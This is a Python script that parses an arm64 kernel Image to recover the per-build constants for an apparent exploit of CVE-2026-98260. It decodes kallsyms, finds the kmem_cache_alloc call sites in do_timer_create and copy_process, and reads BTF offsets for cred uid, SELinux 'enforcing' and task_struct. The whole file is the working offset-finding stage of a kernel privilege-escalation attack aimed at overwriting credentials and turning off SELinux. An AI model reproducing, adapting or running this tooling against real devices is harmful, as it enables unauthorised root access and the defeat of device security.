#!/usr/bin/env python3
"""Recover the CVE-2026-98260 per-build constants from a 6.6/6.12 arm64 kernel Image.

usage: python3 recover.py <kernel.bin>

The image is a bare arm64 Image.  The kallsyms tables are located by structure,
so both the upstream output order and the reordered tables seen in some OTA
builds are handled.  Both the 6.6 kmem_cache_alloc/kmem_cache_alloc_node names
and the 6.12 *_noprof variants are scanned, and the BTF header is validated
before parsing (see README.md).
"""
import struct
import sys

SYMS_WANTED = ['do_timer_create', 'kmem_cache_alloc', 'kmem_cache_alloc_noprof',
               'kmem_cache_alloc_node', 'kmem_cache_alloc_node_noprof', 'copy_process',
               'dup_task_struct', '__tracepoint_sys_exit',
               'selinux_state', 'panic_on_warn', 'root_user',
               'init_user_ns', 'init_ucounts', 'init_groups']
STRUCTS = ['k_itimer', 'cred', 'task_struct', 'selinux_state',
           'task_security_struct', 'tracepoint']


class Image:
    def __init__(self, path):
        self.d = open(path, 'rb').read()
        self.n = 0
        self.base = 0
        self.offs = ()
        self.sym = []
        self.typ = []

    # ---- kallsyms -------------------------------------------------------
    def token_index(self):
        d = self.d
        best = None
        for pos in range(len(d) - 512, 0, -2):
            if d[pos:pos + 2] != b'\x00\x00':
                continue
            idx = struct.unpack_from('<256H', d, pos)
            if not (idx[1] and idx[255] < 0x4000 and
                    all(idx[i] < idx[i + 1] for i in range(255))):
                continue
            for L in range(idx[255] + 1, idx[255] + 96):
                S = pos - L
                if S < 1 or d[S - 1] != 0:
                    continue
                if not all(d.find(b'\x00', S + idx[i], pos) < S + idx[i + 1]
                           for i in range(255)):
                    continue
                # a real token table is followed by markers[0] = 0, so the
                # array walking back from S must be long and increasing
                n, p, prev = 1, S - 4, struct.unpack_from('<I', d, S - 4)[0]
                while p - 4 >= 0 and n < 8192:
                    v = struct.unpack_from('<I', d, p - 4)[0]
                    if v >= prev or v > 0x4000000:
                        break
                    n += 1
                    prev = v
                    p -= 4
                if best is None or n > best[0]:
                    best = (n, S, pos, idx)
        if best is None:
            raise SystemExit('token_index not found')
        return best[1], best[2], best[3]

    def load_syms(self):
        d = self.d
        S, TT, idx = self.token_index()
        toks = [d[S + idx[i]:d.find(b'\x00', S + idx[i])] for i in range(256)]

        def expand(rec):
            o = bytearray()
            for b in rec:
                o += toks[b]
            return bytes(o)

        def dec(start, limit):
            syms, p = [], start
            while p < limit:
                l = d[p]
                p += 1
                if l & 0x80:
                    l = ((l & 0x7f) | (d[p] << 7))
                    p += 1
                if not l or l > 400 or p + l > limit:
                    return None
                syms.append(expand(d[p:p + l]))
                p += l
            return syms, p

        # markers array ends where the token table starts
        end = S
        mvals, p = [], end - 4
        prev = struct.unpack_from('<I', d, p)[0]
        mvals.append(prev)
        while p - 4 >= 0:
            v = struct.unpack_from('<I', d, p - 4)[0]
            if v >= prev or v > 0x4000000:
                break
            mvals.append(v)
            prev = v
            p -= 4
        k = len(mvals)
        names_end = p
        lo, hi = 256 * (k - 1) + 1, 256 * k

        # num_syms sits right before the compressed names blob
        for q in range(0, len(d) - 8, 4):
            for fmt, sz in (('<Q', 8), ('<I', 4)):
                n = struct.unpack_from(fmt, d, q)[0]
                if not lo <= n <= hi:
                    continue
                for st in (q + sz, q + sz + 4):
                    for pad in range(0, 9):
                        r = dec(st, names_end - pad)
                        if not r or len(r[0]) != n:
                            continue
                        self._finish(n, st, r[0], names_end - pad)
                        return
        raise SystemExit('kallsyms names not located')

    def _finish(self, n, names_start, syms, names_end):
        d = self.d
        # offsets array: monotonic s32 array of n entries followed by
        # kallsyms_relative_base
        needle = struct.pack('<Q', 0xffffffc080000000)
        for pos in range(len(d) - 8, 0, -8):
            if d[pos:pos + 8] != needle:
                continue
            st = pos - 4 * n
            if st < 0:
                continue
            offs = struct.unpack_from('<%di' % n, d, st)
            bad = sum(1 for i in range(n - 1) if offs[i] > offs[i + 1])
            if bad == 0:
                self.n, self.base, self.offs = n, 0xffffffc080000000, offs
                self.sym = [s[1:].decode('latin1') for s in syms]
                self.typ = [s[:1].decode('latin1') for s in syms]
                print('kallsyms: n=%d names=%#x..%#x offsets=%#x base=%#x '
                      'monotonic=OK' % (n, names_start, names_end, st, self.base))
                return
        raise SystemExit('kallsyms offsets not located')

    def addr(self, name):
        try:
            i = self.sym.index(name)
        except ValueError:
            return None
        return self.base + self.offs[i]

    # ---- disassembly ----------------------------------------------------
    def w(self, va):
        return struct.unpack_from('<I', self.d, va - self.base)[0]

    def bl_from(self, func, target):
        i = self.sym.index(func)
        st = self.addr(func)
        en = min(self.base + self.offs[i + 1] if i + 1 < self.n else st + 0x8000,
                 st + 0x8000)
        hits = []
        va = st
        while va < en:
            x = self.w(va)
            if (x & 0xFC000000) == 0x94000000:
                imm = x & 0x3FFFFFF
                if imm & 0x2000000:
                    imm -= 0x4000000
                if va + imm * 4 == target:
                    hits.append(va)
            va += 4
        return st, hits

    # ---- BTF ------------------------------------------------------------
    def btf(self):
        best = None
        start = 0
        while True:
            p = self.d.find(b'\x9f\xeb\x01\x00', start)
            if p < 0:
                break
            start = p + 4
            if p + 24 > len(self.d):
                continue
            _, ver, _, hdr, to, tl, so, sl = struct.unpack_from('<HBBIIIII', self.d, p)
            if ver != 1 or hdr < 24 or hdr > 256:
                continue
            if p + hdr + to + tl > len(self.d) or p + hdr + so + sl > len(self.d):
                continue
            if tl <= 0 or sl <= 0:
                continue
            score = tl + sl
            if best is None or score > best[0]:
                best = (score, p, hdr, to, tl, so, sl)
        if best is None:
            return {}
        _, p, hdr, to, tl, so, sl = best
        tb, sb = p + hdr + to, p + hdr + so

        def s(o):
            e = self.d.find(b'\x00', sb + o)
            return self.d[sb + o:e].decode('latin1', 'replace')

        out, off, end = {}, tb, tb + tl
        while off < end:
            no, info, size = struct.unpack_from('<III', self.d, off)
            off += 12
            vlen, kind, kf = info & 0xffff, (info >> 24) & 0x1f, info >> 31
            mem = []
            if kind in (4, 5):
                for _ in range(vlen):
                    mn, mt, mo = struct.unpack_from('<III', self.d, off)
                    off += 12
                    mem.append((s(mn), (mo & 0xffffff if kf else mo) // 8))
            elif kind == 3:
                off += 12
            elif kind == 1:
                off += 4
            elif kind in (6,):
                off += vlen * 8
            elif kind == 19:
                off += vlen * 12
            elif kind == 13:
                off += vlen * 8
            elif kind == 14:
                off += 4
            elif kind == 15:
                off += vlen * 12
            elif kind == 17:
                off += 4
            if kind in (4, 5):
                out.setdefault(s(no), (size, dict(mem)))
        return out


def main():
    if len(sys.argv) < 2:
        raise SystemExit(__doc__)
    im = Image(sys.argv[1])
    im.load_syms()

    print('\nconstants:')
    for w in SYMS_WANTED:
        a = im.addr(w)
        print('  %-30s %s' % (w, ('%#x' % a) if a else 'MISSING'))

    km = im.addr('kmem_cache_alloc') or im.addr('kmem_cache_alloc_noprof')
    kmn = im.addr('kmem_cache_alloc_node') or im.addr('kmem_cache_alloc_node_noprof')
    st, hits = im.bl_from('do_timer_create', km)
    print('\ndo_timer_create = %#x (next %#x)' % (st, st))
    for h in hits:
        print('  bl->kmem_cache_alloc_noprof @%#x  site(idx+1)=%#x  low21=%#x  '
              'func+%#x' % (h, h + 4, (h + 4) & 0x1fffff, h - st))
    st2, hits2 = im.bl_from('copy_process', kmn)
    print('copy_process = %#x' % st2)
    for h in hits2:
        print('  bl->kmem_cache_alloc_node_noprof @%#x  site=%#x  low21=%#x  '
              'func+%#x' % (h, h + 4, (h + 4) & 0x1fffff, h - st2))
    if im.addr('dup_task_struct'):
        st3, hits3 = im.bl_from('dup_task_struct', kmn)
        print('dup_task_struct = %#x' % st3)
        for h in hits3:
            print('  bl->kmem_cache_alloc_node_noprof @%#x  site=%#x  low21=%#x  '
                  'func+%#x' % (h, h + 4, (h + 4) & 0x1fffff, h - st3))

    b = im.btf()
    if b:
        print('\nBTF:')
        for s in STRUCTS:
            if s in b:
                size, mem = b[s]
                keys = [k for k in ('it', 'uid', 'cred', 'enforcing', 'exec_sid',
                                    'create_sid', 'caps', 'funcs') if k in mem]
                print('  %-24s size=%#x %s' % (s, size,
                      {k: hex(mem[k]) for k in keys}))
            else:
                print('  %-24s MISSING' % s)


if __name__ == '__main__':
    main()
